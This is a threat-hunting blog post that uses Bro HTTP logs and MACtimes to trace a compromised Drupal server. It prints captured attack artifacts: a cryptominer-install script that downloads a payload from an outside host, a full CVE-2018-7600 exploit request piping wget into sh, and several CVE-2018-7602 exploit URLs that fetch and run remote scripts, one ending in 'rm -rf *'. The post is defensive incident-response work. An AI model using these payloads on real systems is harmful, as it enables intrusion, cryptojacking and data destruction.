@@ -1,0 +1,131 @@
+More Threat Hunting with User Agent and Drupal Exploits
+
+ 
+
+It's typical to do hunting with user agents by using frequency analysis, sometimes called stacking. But many malicious scripts use built-in tools to grab malware such as wget or curl. Let's see if a compromised server has used a command line tool to get malware or tools.
+
+ 
+
+Start off by grabbing your BRO HTTP logs and pulling out the user agents you want. In this example we are looking for curl, wget, or perl. 
+
+#zcat 2018-04-*/http* |egrep 'curl|wget|perl' >/nsm/tmp/cmdline-internet.txt
+
+ 
+
+Next lets pull out your IP (172.16.1.0) network that is the source as the user agent because we are looking for connections outbound from you network.
+
+#awk '{if ($3 ~ /172.16.1/ ) print $0}' /nsm/tmp/cmdline-internet.txt >>/nsm/tmp/cmdline-internet-outgoing.txt
+
+ 
+
+Now grap the URI that ends with RAR, SH, GZ, TGZ,PL,PY,PHP,TXT. These are the file extension we are going to look for malware that is trying to download. 
+
+#awk '{print $10}' cmdline-internet-outgoing.txt |egrep '\.rar$|\.sh$|\.gz$|\.zip$|\.tgz$|\.pl$|\.py$|\.php$|\.txt$' |sort |uniq
+
+
+While looking through the data a single letter or number file is always interesting because attackers typically use this. I came across the below. 
+
+ 
+
+1524003195.150601 CFzvkl4xwEYKAjEeu6 172.16.1.22 55053 5.2.74.245 80 1 GET 5.2.74.245 /c.sh - - curl/7.43.0 0 0 - -- - (empty) - - - - - - - - -
+
+1524044872.633174 CXBXqE1ZCC3d8Ka4Hi 172.16.1.22 57165 5.2.74.245 80 1 GET 5.2.74.245 /c.sh - - curl/7.43.0 0 0 - -- - (empty) - - - - - - - - -
+
+1524051612.017796 CKkmMp3GdGwiE7yppi 172.16.1.22 57527 185.165.169.146 80 1 GET 185.165.169.146 /c.sh - - curl/7.43.0 0 0 
+
+
+I looked at the file to see what's in it. In this case, it contained the following script.
+
+ 
+
+curl hxxp://185.165.169.146/c.sh
+
+mkdir /tmp/.x11_kenp0le/
+
+curl hxxp://185.165.169.146/sen -o /tmp/.x11_kenp0le/nttprd
+
+chmod +x /tmp/.x11_kenp0le/nttprd
+
+/tmp/.x11_kenp0le/nttprd -B -a cryptonight -o stratum+tcp://pool.minexmr.com:80 -u 49CSBHFhjm5RVGiJuVh7ANEsdozsXMfkCE2rCEHXjTgoJNVdSzyvg8tM1xLpQH8R7mfcEf5jtArJf5S9XBrgfmNz5yTRMiM -p x &>>/dev/null
+
+
+ 
+
+The script appears to be installing a cryptocoin miner. Let's go back through BRO and see if this system accessed the file.
+
+#zcat http* |fgrep 185.165.169.146 |fgrep sen
+
+1524051614.459145 CI8e9G1izBkAi8rN8h 172.16.1.22 57528 185.165.169.146 80 1 GET 185.165.169.146 /sen - - curl/7.43.0 0 0 - -- - (empty) - - - - - - - - -
+
+
+
+ 
+
+Based on the results, we know it at least tried to download the file. Now it's time to start looking at the system. After collecting MACtimes from the system disk, let's see what happened in the temp directory.
+
+#fgrep ‘.x11_kenp0le’ mactime.csv
+
+Mon Apr 23 2018 04:05:12,68,m.c.,drwxr-xr-x,501,0,0,"/tmp/.x11_kenp0le"
+
+Tue Apr 24 2018 13:08:10,68,.a..,drwxr-xr-x,501,0,0,"/tmp/.x11_kenp0le"
+
+
+
+ 
+
+Looking at these results, it appears that only the folder was created, but the file was not downloaded to the disk. It turns out this system was running an unpatched version of Drupal (CVE-2018-7600), and below was the payload for the exploit. 
+
+ 
+54.37.67.39 : 39474
+POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
+Content-Length: 171
+Content-Type: application/x-www-form-urlencoded
+Host: 172.16.1.22
+Connection: Keep-Alive
+User-Agent: Apache-HttpClient/4.5.5 (Java/1.8.0_151)
+Accept-Encoding: gzip,deflate
+form_id=user_register_form&_drupal_ajax=1&mail%5B%23post_render%5D%5B%5D=exec&mail%5B%23type%5D=markup&mail%5B%23markup%5D=wget+-qO+-+http%3A%2F%2F54.39.23.28%2F1sh+%7C+sh
+
+ 
+
+ 
+
+ 
+
+Speaking of Drupal exploits, we are seeing some new exploits in the wild for the latest CVE this week (CVE-2018-7602).
+
+ 
+
+I’ve seen several variations of the following attack.
+
+http://172.16.1.22/?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&name%5B%23markup%5D=wget+-O+kurd.php+%27http%3A%2F%2Fwww.ioletravel.gr%2F1.txt%27
+
+ 
+
+I pulled down 1.txt and did a quick look at it. It appears to be download a version of request-sanitizer.inc (pastebin.com/raw/PTLaTqvh) and bootstrap.inc (pastebin.com/raw/j0nms59V') and replaces these files. This code looks to be the work-around patch from Drupal.
+
+After it patches, it profiles the system, creates 3 file upload backdoors each named apis.php. Finally, its creates a krd.html that is the defacement which links back to a picture on hxxp://zonehmirrors.org.
+
+ 
+
+There is a base64 version of the same attack above.
+
+http://172.16.1.22/?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=array_map&name%5B%23suffix%5D=eval%28base64_decode%28%22JGt1cmQ9YmFzZTY0X2RlY29kZSgiUEQ5d2FIQU5DbWxtS0dsemMyVjBLQ1JmUjBWVVd5SnJkWEprSWwwcEtR (Truncated)
+
+ 
+
+The last version I’ve seen I was not able to pull down the script to see what it did to the system. If anyone has a copy please pass it along.
+
+http://172.16.1.22/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=cd%20/tmp;%20wget%20hxxp://185.101.97.249/runp.sh%20;%20chmod%20777%20runp.sh%20;%20./runp.sh%20;%20rm%20-rf%20*
+ 
+
+Let us know if you are seeing other variations of the attacks.
+
+ 
+ 
+
+-- 
+
+Tom Webb
+
+@twsecblog
